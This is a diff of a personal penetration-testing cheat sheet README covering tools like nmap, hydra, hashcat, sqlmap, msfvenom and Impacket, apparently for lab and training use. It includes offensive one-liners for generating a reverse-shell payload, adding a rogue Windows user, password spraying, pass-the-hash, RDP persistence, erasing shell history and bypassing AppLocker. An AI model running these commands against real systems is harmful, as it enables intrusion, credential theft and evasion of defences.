@@ -1,15 +1,14 @@
+# Welcome to the Command-Center!
 
-<h1 align="center">Welcome to the Command-Center!</h1>
+## There are so many tools, commands and switches... it's easy to confuse them! I made this repo so you can quickly search for the right ones when needed.
 
-<h2 align="center">There are so many tools, commands and switches... it's easy to confuse them! I made this repo so you can quickly search for the right ones when needed.</h2>
+Let's exit the outside world and enter cyber space. (We have cookies... 😎)
 
-<h3 align="center">Let's exit the outside world and enter cyber space. (We have cookies... 😎)</h3>
+![metal_door](images/001_metal-door.jpg)
 
-<img src="images/001_metal-door.jpg">
+Use your browser's search function to quickly find commands for a tool you need. In Firefox for example this is done by using `CTRL+F`
 
-<p align="justify">Use your browser's search function to quickly find commands for a tool you need. In Firefox for example this is done by using <code>CTRL+F</code></p>
-
-<p align="justify">Alternatively you can just browse through these commands using your browser's slider or your mouse wheel in the middle. Anyways, I hope this repo can serve you well, let me know if you have any comments or suggestions, you can reach me here or on LinkedIn @codetorok thanks for checking out the Command-Center!</p>
+Alternatively you can just browse through these commands using your browser's slider or your mouse wheel. Anyways, I hope this repo can serve you well, let me know if you have any comments or suggestions, you can reach me here or on **[LinkedIn](https://www.linkedin.com/in/codetorok/)**. Thanks for checking out the Command-Center!
 
 * Go here if you are looking for:
 * **[TOR Service / Anonymity](https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md)**
@@ -20,276 +19,382 @@
 * **[Pivoting in Metasploit](https://github.com/codetorok/command-center/blob/master/pivoting_metasploit/pivoting_metasploit.md)**
 * **[Buffer Overflow (Basic)](https://github.com/codetorok/command-center/blob/master/buffer_overflow/buffer_overflow.md)**
 
-<img src="images/003_available_commands.png">
+![available_commands](images/003_available_commands.png)
 
-<p align="justify"><code>amass</code> is really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)</p>
+## Amass
+Really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)
 
-<img src="images/amass_subdomain_enumeration.png">
+* `amass -ip -d <domain.com>`
 
-<p align="justify"><code>binwalk</code> extracts files hidden in pictures, pretty good for stegonograpy.</p>
+* If you don't have ***amass*** installed on your system:
+  * `apt install snapd`
+  * `service snapd start`
+  * `snap install amass`
+  * `snap run amass`
 
-<img src="images/binwalk_steghide_stegonography.png">
+## Binwalk 
+Extracts files hidden in pictures, pretty good for stegonograpy.
 
-<p align="justify">If you wan't full anonimity (as much as you can get, don't go crazy here) you need to know how to change dns. If you combine this with <code>proxychains</code> using TOR (link to setup: https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md), you're pretty much good to go as long as you also have WebRTC disabled (link to setup: https://support.avast.com/en-us/article/Prevent-WebRTC-IP-leak/).</p>
+* `binwalk somepicture.jpg -e`
 
-<img src="images/change_dns.png">
+## public IP from terminal
 
-<p align="justify">These are not commands, I just thought it might come in handy if you need a quick refresher to find a port or ports.</p>
+* `dig +short myip.opendns.com @resolver1.opendns.com`
 
-<p>Check your public IP from terminal.</p>
+* `curl ifconfig.me` an even shorter command which I really love :)
 
-<p>dig +short myip.opendns.com @resolver1.opendns.com</p>
+## curl
+You can do some great things with **_curl_**, it's worth going through it's man page, this is one of the great techniques I use quite often:
 
+* `curl -s <domain or IP> | grep "<form"` to discover which HTTP methods are available. `-s` is for _silent_ mode.
 
-<img src="images/common_ports.png">
+* `curl -X DELETE <http://IP:PORT>` if you get a 200 OK that means that method is supported, you can try all the others as well like PUT, etc..
 
-<p align="justify">You can do some great things with <code>curl</code>, it's worth going through it's man page, this is one of the great techniques I use quite often.</p>
+Directory discovery with **_dirb_** when username and password is known:
+* `dirb <http://IP or domain/> -u <username>:<password>`
 
-<img src="images/curl_checking_login_page_form_method.png">
+Directory busting with **_dirsearch_** is another great option:
+* `dirsearch.py -u <http://IP or domain> -e php, html -x 400, 401, 403` the `-x` is to exclude those type of error response codes.
 
-<p align="justify">Directory discovery with dirb when username and password is known.</p>
+## Docker & Juice Shop
+This is how you install **_Docker_** on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker:
 
-<img src="images/dirb.png">
+1. `curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg > /dev/null`
+2. `echo 'deb [arch-amd64 signed-by-/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list`
+3. `apt update`
+4. `apt install docker-ce` 
+5. `docker --version`
 
-<p align="justify">Directory search, dirsearch is great if you have to find directories on a webapp.</p>
+To install **_Juice Shop_**
 
-<img src="images/dirsearch_directory_enumeration.png">
+1. `docker pull bkimminich/juice-shop`
+2. `docker run --rm -p 3000:3000 bkimminich/juice-shop`
+3. browse to *_http://localhost:3000_* (on macOS and Win browse to *_http://192.168.99.100:3000_* if you are using docker-machine instead of the native docker installation)
 
-<p align="justify">This is how you install Docker on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker.</p>
+Once you installed **_Juice Shop_** and want to run it on different ocasions there's this simple bash script to help you with. Just make a file with nano, name it as _run_juice_shop.sh_ or whatever you want to name it copy/paste the below code in it,save it and make it executable with `chmod +x run_juice_shop.sh`:
+```
+#!/bin/bash
 
-<img src="images/docker_installing.png">
+sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
+```
 
-<p align="justify">Once you installed Juice Shop and want to run it in different ocasions, it's hard to remember that docker command so I made this little shell script, now I only have to type in the name of my script file and I'm runnig the shop.</p>
+## grep
+So let's say you have to crack a password that's from a website that uses just a 4 characters long passphrase. To save up time you can just make a copy of your rockyou.txt or whatever monstrous passlist your using and then filter the copy into a new file that has only the 4 characters long entries (hence this **_grep_** one liner) from your rockyou-copy.txt. Copy is needed to not to mess up the original one, you can never be cautious enough ;)
 
-<img src="images/juice_shop_run.png">
+* `grep -E '^.{4}$' rockyou-copy.txt > only4words.txt`
 
-<p align="justify">So let's say you have to crack a password that's from a website that uses just a 4 characters long passphrase. To save up time you can just make a copy of your rockyou.txt or whatever monstrous passlist your using and then filter the copy into a new file that has only the 4 characters long entries (hence this grep one liner) from your rockyou-copy.txt. Copy is needed to not to mess up the original one, you can never be cautious enough ;)</p>
+## SUID
+**_Set-user Identification_** are files with special root priv permissions. It happens when root doesn't want to make a user root user just in certain cases when user runs some files that requires sudo permissions. Finding these files are imporant as SUID can be abused. SUID starts with a 4 and SGID -which is similar to SUID starts with a 2. The only difference between the two is that when a script or command with SGID (Set-group Identification) permission runs, it runs as if it were a member of the same group in which the file is a member.
 
-<img src="images/filtering_rockyou_to_4_characters_long_entries_only.png">
-  
-<p align="justify">SUID or Set-user Identification are files with special root priv permissions. It happens when root doesn't want to make a user root user just in certain cases when user runs some files that requires sudo permissions. Finding these files are imporant as SUID can be abused. SUID starts with a 4 and SGID -which is similar to SUID starts with a 2. The only difference between the two is that when a script or command with SGID (Set-group Identification) permission runs, it runs as if it were a member of the same group in which the file is a member.</p>
+If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.
 
-<p align="justify">If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.</p>
+* `find / -perm +6000 2>/dev/null | grep '/bin/'` only use grep if you need it or looking for a very specific location
 
-<img src="images/find_binary_permissions.png">
-  
-<p align="justify"><code>fping</code> helps you to ping a range of IP addresses.</p>
+## fping
+Helps you to ping a range of IP addresses.
 
-<img src="images/fping.png">
+* `fping -a -g 192.168.0.10 192.168.0.255` the `-a` is for all hosts alive and the `-g` is for the range of IP addresses.
 
-<p align="justify">Find file in Windows.</p>
+## dir (Win)
+Searching in **_Windows_** using the `dir` command we have the following switches available: (credit: find the original post by __computerhope.com__ [here](https://www.computerhope.com/dirhlp.htm)) 
 
-<img src="images/how_to_find_a_file_in_windows_terminal.png">
+* `dir *.txt *.doc` to list any file whose name has the file extension _.txt_ or _.doc_
+* `dir /a:d` to list only directories
+* `dir /a:r` to list only files with the read-only attribute
+* `dir /s` to list files and directories in the directory, and in any subdirectories. For instance, if your current directory is the root directory "C:\>," this command lists every file and directory on the C: drive
+* `dir /p` to pause after each screenful of output. Use this option if the information is scrolling past the screen before you can read it. You are prompted to press any key before listing continues past the current screen
+* `dir /w` to list multiple file names on every line, producing "wide" output, which displays more file names at once. However, other information such as file size is omitted
+* `dir /s /w /p` to recursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of outputecursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of output
+* `dir /s /w /p "C:\Program Files"` same as the above command, but lists everything in __C:\Program Files__, instead of the current directory. Because the directory name contains a space, it is enclosed in double-quotes, to prevent it from being interpreted is as two separate options
+* `dir /s /q /a:sh /p C:\Windows` Lists any files and directories in __C:\Windows__, and any of its subdirectories `/s`, which have both the "hidden" and "system" file attributes `/a:sh`. Also, lists the owner of the file `/q`, and pauses after each screen of output `/p`
+* `dir \ /s | find "i" | more` the above command uses vertical bars to pipe the output from dir to the command find, and then to the command more. The result is a list of all files and directories in the root directory of the current drive (\), with extra information. Namely, find also displays the number of files in each directory, and the amount of space occupied by each
+* `dir /s /a:hs /q C:\Windows > myfile.txt` runs the _dir_ command, but redirects the output to the file __myfile.txt__, instead of displaying it on the screen. To view the contents of the file, you can use the `type` command and your file name, if the file is very long try it with `type myfile.txt | more`
 
-<p>Erase history when using zsh for example from bash, create a function and then call it: </p>
+## zsh
+**_Erase history_** when using **_zsh_** for example from bash, create a function and then call it:
 
-<p>function erase_history { local HISTSIZE=0; }</p>
-<p>erase_history</p>
+1. `function erase_history { local HISTSIZE=0; }`
+2. `erase_history`
 
-<p>Persistence via RDP
+## Persistence via RDP
+(credit: [Joe Helle aka The Mayor, MPP course](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers))
 
-* enabling Remote Desktop via powershell: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
-* now we can connect to it from kali: `xfreerdp /u:s.schisholm /p:'FallOutBoy1!' /v:<target IP>`
-* to disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"` 
-</p>
-  
-<p align="justify">I wanted to share this one too as at first I couldn't get the binary from the ftp server. First I have to use the command <code>binary</code> and then I can get it like I normally would.</p>
+1. `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"` enabling Remote Desktop via powershell
+2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
+3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
-<img src="images/ftp_server_get_binary.png">
-  
-  <p align="justify">There are different ways you can use <code>gobuster</code> this is the one I use most of the times. The <code>-u</code> is for the host name <code>-w</code> is for the wordlist and <code>-t 40</code> is for the threads so it won't take forever. The <code>tee gobuster-initial</code> is so I can redirect the output to this file and can analyze it later if needed, or just to put it into my pentest report if on an assasment.</p>
+## gobuster
+There are different ways you can use **_gobuster_** this is the one I use most of the times. The `-u` is for the host name `-w` is for the wordlist and `-t 40` is for the threads so it won't take forever. The `tee gobuster-initial` is so I can redirect the output to this file and can analyze it later if needed.
 
-<img src="images/gobuster.png">
-  
-<p align="justify">To simplify things this gpg example is for the symmetric type of encryption, but you can check out the man page and discover a lot more options to encrypt/decrypt.</p>
+* `gobuster dir -u http://<IP or domain> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 | tee gobuster-initial`
 
-<img src="images/gpg_symmetric_encrypt_decrypt.png">
-  
-  <p align="justify">Cracking hashes with <code>hashcat</code> basic synthax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory.</p>
+* with the same way but using the `vhost` option one can enumerate subdomains as well just changed the `dir` to `vhost` in the above command and maybe use a different wordlist for that purpose
+
+# gpg
+(The ***SHORT ID*** on the key is the last 8 digits of the fingerprint, the ***LONG ID*** is the last 16 digits.)
+* `gpg --full-generate-key` to generate a key pair
+* `gpg --output ~/revocation.crt --gen-revoke our_email_address` to generate a revocation certificate in case your private key gets compromised
+* `chmod 600 ~/revocation.crt` to remove all permissions from this certificate
+* `gpg --import <someones.key>` importing someone else's public key
+* `gpg --fingerprint someone@email.com` checking someone elses public key's fingerprint for validation
+* `gpg --sign-key someone@email.com` sing someone's public key for trust
+* `gpg --output ~/dave-geek.key --armor --export ouremail@email.com` sharing our public key
+* `gpg --send-keys --keyserver pgp.mit.edu <fingerprint>` sending our public key to a keyserver
+* `gpg --encrypt --sign --armor -r ouremail@email.com <file_to_encrypt>` encrypting a file
+* `gpg --decrypt encrypted.asc > plain.txt` decrypting a recieved encrypted file
+* `gpg --keyserver pgp.mit.edu --refresh-keys` to refresh our public keys against the key server
+* `gpg --keyserver pgp.mit.edu --send-keys <key ID>` sending the revocation of the key to the key server
+* `gpg --keyserver pgp.mit.edu --search-keys <ID or email address for the key your searching for>` searching for public keys on ***pgp.mit.edu***
+* `gpg --search-keys <ID or email address for the key your searching for>` searching for public keys on ***https://keys.openpgp.org:443***
 
-<img src="images/hashcat.png">
-  
-  <p align="justify">How to locate the <code>hashcat.potfile</code> where the cracked hashes are stored.</p>
+### Addtitionally we can:
 
-<img src="images/hashcat_potfile.png">
-  
-<p align="justify">I mainly created this image for the web login crack part only. Sometimes it's hard to remember how it's done using hydra.</p>
+****
+* `gpg --list-keys` then `gpg --edit-key <user ID>` in the gpg prompt select the key with the right ID `key 1` follow the instructions to change the expiration date of your key, use `help` for further assitance
+* `gpg --list-keys` to list available keys
+* `gpg --import <key_name>.asc` to import a key
+* `gpg -o message.sig -s <message_file>` to sign a "message file"
+* `gpg --verify message.sig` to verify the signature
+* `gpg -o message.asc --clearsing message` to sign a file with a clear-text signature
+* `gpg --delete-key "User name"` to delete a public key
+* `gpg --delete-secret-key "User name"` to delete a secret key
+* `gpg -o secret.gpg -c somefile` to encrypt a file that no one else has to decrypt use gpg to perform symmetric encryption
+* `gpg -o myfile --decrypt secret.gpg` to decrypt a file encrypted with a symmmetric key
+* `gpg --import <backupkeys.pgp>` import the backup keys
+* `gpg --import <revocation file, ex revoke.asc>` imorting the revocation certificate
 
-<img src="images/hydra.png">
-  
-<p align="justify">Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output into the johncracked.txt</p>
+# sed
 
-<img src="images/john.png">
-  
-<p align="justify">Passing a private key to <code>gpg2john</code> to prep it and then passing the output file to john to crack it :) once it's done you can use the cracked password and the private key to try to log in to the target's system via ssh: <code>ssh -i id_rsa username@IP</code></p>
+* `sed -i 's/text_to_replace/new_text/g' <file name>` without the `g` parameter at the end sed will only replace the first instance on each line only and without the `-i` switch sed will no overwrite the file we are working with, if we want to save the results as a new file we can just redirect the output to a new file like so: `sed -i 's/test_to_replace/new_text/g' <original file> > <new file>`
+* `sed -n 's/text_to_replace/new_text/pg'` sed `-n` means no output unless there is a match because of the `p` parameter
+### sed is very usefull when comnining it with grep IMO
 
-<img src="images/john2.png">
+## hashcat
+Basic synthax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory. The _mode number_ can be found **[here](https://hashcat.net/wiki/doku.php?id=example_hashes)**
+* `hashcat --force -m <mode number> -a 0 crackthis.txt /usr/share/wordlist/rockyou.txt`
+* to find the _hashcat potfile_: `cat ~/.hashcat/hashcat.potfile`
 
-<p align="justify">Installing Juice Shop to practice the OWASPtop10, great resource! I installed it on a Docker instance, if you need it you can find how to install it on your system just look for it on this page.</p>
+## hydra
+I mainly created this part because of the web login attack part. Sometimes it's hard to remember the sythax.
 
-<p>Here's the link for reference: https://github.com/bkimminich/juice-shop</p>
+* `hydra -l <user name> -P <full path to the password list> ssh://<IP>` using Hydra against ssh
+* `hydra -l <username> -P <full path to the password list> ftp://<IP>` using Hydra against
+* `hydra -L <username list> -p <password> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30` you can capture the error message (Invalid username) by trying a credential on the target website and replace the one I have in this synthax if needed. This example tests several usernames for the same password, a technique also called password spraying.
 
-<img src="images/juice_shop_installing.png">
-  
-<p align="justify">Decoding MD5 hashes, just don't forget to use <code>echo</code> with the <code>-n</code> switch.</p>
+## John
+Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output  into athe johncracked.txt
 
-<img src="images/md5_hash_generate.png">
+* `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`
 
-<p>msfvenom Windows add user</p>
+### gpg2john
+Passing a private key to **_gpg2john_** to prep it and then passing the output file to john to crack it :) once it's done you can use the crack password and the private key to try to log in to the target system via ssh with `ssh -i id_rsa <username>@<IP>`
 
-<img src="images/msfvenom_windows_add_user.png">
+* `gpg2john id_rsa > id_rsa_prepped_for_john.hash` prepping the private key for a format understandable by john
+* `john --wordlist=rockyou.txt --format=gpg id_rsa_prepped_for_john.hash`
 
-<p align="justify"><code>msfvenom</code> reverse shell, <code>-p</code> for payload and <code>-f</code> for the format in this case it's raw so I can send the output into a <code>.php</code> file.</p>
+### zip2john
+Prepping a zip file for using it with _john_.
 
-<img src="images/msfvenom_reverse_shell_php.png">
+* `zip2john <zipfile name> > <output file name>`
 
-<p align="justify">How to connect and display info from <code>mysql</code> database.</p>
+With the same fashion there's **_pdf2john_** as well with a very similar synthax.
 
+## playing with encoding and hashes
+If you are interested in more depth on this matter check out the cyberchef's website.
 
-<img src="images/mysql.png">
+* `echo -n 'hashes are cool | md5sum`
+* `echo -n 'hashes are cool' | base64` encoding with base64
+* `echo -n 'aGFzaGVzIGFyZSBjb29s' | base64 -d` decoding with base64
+* `echo -n 'hashes are cool' | rot13` encoding and decoding is the same synthax
 
-<p align="justify">The most used switches with <code>nmap</code>, also you can use the <code>-A</code> switch to get all the services and their version number at once. If working on a network, not just a single IP, I prefer to know what's what before starting to focus on one machine or the other as it saves up time.</p>
+## msfvenom
 
-<img src="images/nmap_scans.png">
+* *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
 
-<p align="justify">This is real life scenario, first I would suggest if you're dropped in an enviroment without anything, check your IP address on the network, then run these scans to identify other machines, their purpose and services, version numbers, open ports etc with nmap.</p>
+* *_rev shell:_* `msfvenom -p windows/shell_reverse_tcp lhost=<local host IP> lport=<local host listening port> -f raw > exploit.php`
+
+## sql / mysql
+There are many more thing that can be done by using sql, for example if there is an option for that you can list the data of all employees and if it's defined in the database who's admin or not when logged in and you can write to this database you can create a new employee with admin rights then use those credentials to log into the system. I left this section here for the newcomers, maybe I'll add to it later on.
 
-<img src="images/nmap_scans_real_life.png">
+* how to connect to it: `mysql -u <username> -p -h <IP>`
+* to view the tables: `source example.sql`
+* to select a database: `USE <db name>;`
+* displaying the tables: `SHOW TABLES;`
+* display everything from the employees database: `SELECT * FROM employees;`
 
-<p align="justify">I include xsltproc one as well in case you want to generate an html report based on your nmap scan file.</p>
+## nmap
+You can always look up for an nmap script which is usually stored in `ls /usr/share/nmap/scripts/` and can use them with the `--script <script name>`. For example to check for the infamous *_eternal blue_* exploit you would use `nmap -p 445 --script smb-vuln-ms17-010.nse <target>`.
 
-<img src="images/nmap_scans_report.png">
+* `nmap -sn <192.168.0.1/24>` or `nmap -sn 192.168.0.1-15` or `nmap -sn 192.168.0.*` or `nmap -sn 192.168.0.12*` are different ways for checking a range of IPs. The `-sn` is for the ping scan to discover live hosts on the network. Very useful if on a black box assessment.
+* `nmap -sn -iL hostlist.txt` if you want to use a file containing the list of IPs you want to check.
+* if you already know the hosts are alive you can use the `-Pn` option to skip the ping scan and maybe just try to fingerprint the OS: `nmap -Pn -O 192.168.0.1`
+* if you have to scan hundreds of hosts we should at first limit OS recon to just the promising ones: `nmap -O --osscan-limit 192.168.1-125`
+* to check if smb singing is disabled on any of the /24 subnet we can use `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24` finding the script on the same location I showed you at the beginning of this section.
+* Checking if nmap can find any known vulnerability against the smb service: `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24`
 
-<p align="justify">psexec.py from Impacket.</p>
+## A real life scenario using nmap
+If you're dropped in an enviroment without anything, check your IP address on the network, then run these scans to identify other machines, their purpose and services, version numbers, open ports etc with nmap.
 
-<img src="images/psexec_py.png">
+1. `nmap -sn 172.16.37.0/24 -oA initial_discovery.nmap` to check for live hosts on the network and save the output in all formats into the _initial_discovery.nmap_ file.
+2. `cat initial_discovery.nmap | grep for | grep -v "\.234" | cut -d " " -f 5 > ips.txt` we need to exclude our own IP which ends with _.234_ hence we need the `-v` switch with grep, and `cut -d " " -f 5` will cut the spaces and keeps the 5th field which is the IP address from `Nmap scan report for <IP>`
+3. Finally `sudo nmap -sV -n -O -p- -Pn -T4 -iL ips.txt -A --open -oA final_discovery.nmap` which is `-sV` to get the service version number, `-n` disabling reverse DNS lookup, `-O` is for OS fingerprinting, `-p-` scanning all ports, `-Pn` skip the ping scan, treat all hosts as live, `-T4` is for performance, `-iL` to use the IPs from the ips.txt file and `-A --open` to get all information on the open ports, `-oA` to save the output in a file.
 
-<p align="justify">Pass the hash Windows pth-winexe.</p>
+One more thing: if you need to generate a nice html report from the output you can use *_xsltproc_*:
 
-<img src="images/pth_winexe_pass_the_hash.png">
+* `sudo xsltproc final_discovery.nmap -o nmap_DATE_TARGET.html`
 
-<p align="justify">Public IP address form Linux termnal.</p>
-<p>dig +short myip.opendns.com @resolver1.opendns.com</p>
-<p>An even shorter comand to get the public IP is: curl ifconfig.me</p>
+## Impacket
 
-<p align="justify">Extract the email address from a public key.</p>
+### psexec
+* `psexec.py <username>:'<password>'@<IP>`
 
-<img src="images/public_key_gpg_extract_email.png">
+### pass the hash
+* pass the hash, Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`
 
-<p align="justify">Python but it can be used in Python3 as well to spawn a terminal.</p>
+## Python3
+### One liners and quick scriptsb 
+(Later on this section will be moved just like AD and the others at the beginning of this repo. This is just to simplify and better organize this space.)
 
-<img src="images/spawn_terminal_in_python.png">
+* to spawn a shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+* webservers: `python3 -m http.server 8080`
+* if webserver is picked up by the firewall use ftp server: `python3 -m pyftpdlib -p 21 --write` and if you don't have it get it first with: `pip3 install pyftpdlib` and to log in just use the IP address of your ftp server: `ftp <ftp server IP>`
 
-<p align="justify">Python3 webserver and ftpserver set up commands.</p>
+#### QRCode generator (Python3)
 
-<img src="images/python3_webserver_ftpserver.png">
+```
+import qrcode
 
-<p align="justify">Python3 anonymous writable ftp server.</p>
+input_data = "https://google.com"
+qr = qrcode.QRCode(version=1, box_size=10, border=5)
+qr.add_data(input_data)
+qr.make(fit=True)
+img = qr.make_image(fill='black', back_color='white')
+img.save('qrcode001.png')
+```
 
-<img src="images/python3_anonymous_ftp_writable.png">
+#### progress bar (Python3)
 
-<p align="justify">When I started out I got confused a lot in how to use smbclient and smbmap so I made these screenshots, one is to connect and the second one is to list the available services.</p>
+```
+for i in range(0, 51):
+    time.sleep(0.1)
+    sys.stdout.write("{} [{}{}]\r".format(i, '#' * i, "." * (50 - i)))
+    sys.stdout.flush()
+sys.stdout.write("\n")
 
-<img src="images/smbclient_conneting_to_share.png">
+```
 
-<p>List services with smbclient.</p>
+#### printing and checking a usage form and switches (Python3)
 
-<img src="images/smbclient_listing_shares.png">
+```
+if len(sys.argv) == 1:
+    print("USAGE: python3 the_sys_module.py <code name>")
+    print("No arguments, exiting...")
+    sys.exit(9)
+if sys.argv[1] == "tellmemore":
+    print("Code name accepted..., exiting with exit code 0.")
+else:
+    print("Wrong code name, exiting with exit code 3.")
+```
 
-<p>smbclient <code>prompt</code> is to not to ask me for a prompt every time I download something, it is important because in the next command I turn <code>recursive</code> on which will download everything recursiveley (without having to prompt) and the third command is just to get everything from the share we can.</p>
+## smbclient
+Just a couple of things here.
 
-<img src="images/smbclient_prompt_recursive_mget.png">
+* `smbclient -L //IP` to list the available shares
+* once connected you can use the `prompt` command for smbclient to not to ask you for a prompt every time you want to download something
+* `recursive` is used to be able to download something recursively from a folder 
 
-<p>sqlmap usage</p>
+## sqlmap
+One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.
 
-<img src="images/sqlmap.png">
+* `sqlmap -u http://sqli.site/view.php -D <db_name> -T <table_name ex: users> -C <username.password> --dump`
+* `sqlmap -u http://sqli.view.php -D <db_name> -T <table_name> --dump-all`
+* `sqlmap -u http://sqli.view.php?id=1 --users`
+* `sqlmap -u http://sqli.view.php?id=1 --tor --tor-type=SOCKS5`
+* `sqlmap -u http://sqli.view.php?id=1 --dbs`
+* `sqlmap -u http://sqli.view.php -D <db_name> --tables`
 
-<p>Additionally to sqlmap: capture a login request with Burp and save it in a file ex. login.req, than in sqlmap: sqlmap -r login.req --level 5 --risk 3</p>
+Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`
 
-<p>Using the session cookies and sqlmap: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
-cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"</p>
+If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`
 
-<p>If the target is vulnerable for the get request (see above) we can get a shell out of it: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
-cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell</p>
+## ssh
 
-<p align="justify">How to add your generated ssh key to your known hosts. It helps with Github also.</p>
+*_This section is under development_*
 
-<img src="images/ssh_key_add.png">
+## steghide
+Added for fun :) extract a file form a picture.
 
-<p align="justify">SSH port forwarding.</p>
+* `steghide extract -sf <picutre.jpg>`
 
-<img src="images/ssh_local_port_fowarding.png">
+## sublist3r
+A great tool for subdomain enumeration.
 
-<p align="justify">Extract a file from a picture with steghide.</p>
+* `sublist3r -d <website.com> -t 50`
+* it has a built in brute force modul: `sublist3r -d <domain> -b` which will use a built in list that can be found here: `/usr/share/sublist3r/subrute/names.txt`
 
-<img src="images/steghide.png">
+## tar
+No big deal here, just had to remember the how to extract a .tar.gz package so I saved it here for reference.
 
-<p align="justify">sublist3r is a subdomain enumeration tool, quite good actually.</p>
+* `tar -xvf <somefile.tar.gz>`
 
-<img src="images/sublist3r_subdomain_enumeration.png">
+## quickly append IP to your /etc/hosts file
 
-<p align="justify">No big deal, just had to remember how to extract a .tar.gz package at the beginning. Hope this helps you too!</p>
+* `sudo echo '<192.168.0.23> <retrowerb.htb>' | tee -a /etc/hosts`
 
-<img src="images/tar_extract.png">
+## theharwester
+For subdomain enumeration.
 
-<p align="justify">You can append an IP to your /etc/hosts file but this simple one liner using the command <code>tee</code> is easier than opening it up in nano every time you need it.</p>
+`theharvester -d <domain.com> -l 500 -b google` where `-l` is to for how deep to go and `-b` is for the search engine.
 
-<img src="images/tee_append.png">
+## to upgrade a shell on the target machine
+Some shells are fuzzy but after an upgrade you can have a proper one with all the normal shell functions like TAB, etc...
 
-<p align="justify">Quite good for subdomain enumeration, with theharvester you can even choose your preferred search engine!</p>
+1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+2. `export TERM=xterm
+3. here you want to press `CTRL+z` to background your session
+4. `stty raw -echo; fg` I like to add `fg` here to bring the session to the foreground again and don't have to do it as a next command
 
-<img src="images/theharvester_subdomain_enumeration.png">
+## virtualbox
+Need this config to be able to make virtualbox work with both bridged and NAT at the same time.
 
-<p align="justify">If you're looking for setting up and using TOR services you can find everything here:
-https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md</p>
+* `sudo nano /etc/network/interfaces`
+* edit the file: `allow-hotplug eth1` uncomment it
+* edit the file: `iface eth1 inet dhcp` uncomment it
+* save the changes, exit nano then: `sudo ifup eth1` to apply the changes on the running system.
 
-<p align="justify">Classic! You popped a shell, now it's time to upgrade it and this is how to upgrade reverse shell the proper way so you'll have autocomplete with TAB etc etc... :)</p>
+## wfuzz
+Enlists subdomains based on a wodlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.
 
-<img src="images/upgrade_shell.png">
+* `wfuzz -c -f sub-fighter -w top5000.txt -u http://<domain> -H "HOST: Fuzz.domain.com" --hw 290`
 
-<p align="justify">You need this configuration if you want to make Virtualbox work with both type of network connections at the same time: NAT and Bridge</p>
+## bypass AppLocker in Windows
+There are many ways to bypass AppLocker rules, if it's configured with the default rules, we can bypass it just by placing our executable into this directory which is whitelisted by default:
 
-<img src="images/virtualbox_bridge_and_nat_same_time.png">
+* `c:\Windows\System32\spool\drivers\color`
 
-<p align="justify">wfuzz is built into kali and it's an excellent subdomain enumeration tool.</p>
+## Windows file transfer
+In case you have to bring a file over to the compromised Win machine. The last piece of information is how do you want to name the file you bring over.
 
